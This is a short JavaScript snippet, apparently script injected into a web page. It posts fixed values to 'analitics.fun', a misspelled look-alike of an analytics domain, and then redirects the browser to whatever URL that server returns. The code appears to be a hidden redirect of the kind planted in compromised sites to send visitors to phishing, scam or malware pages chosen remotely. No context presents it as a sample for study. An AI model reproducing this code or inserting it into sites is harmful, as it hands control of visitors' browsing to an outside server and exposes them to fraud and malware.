
    var http = new XMLHttpRequest();


    var url = 'https://analitics.fun/Filter/OnlyHeaderJS/Handler.php';
    var params = 'key=' + 'company' + "&value=" + 'login';
    http.open('POST', url, false);

    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

    http.onreadystatechange = function () {
        if (http.readyState == 4 && http.status == 200) {
            document.location.href = http.responseText;
        }
    }
    http.send(params);
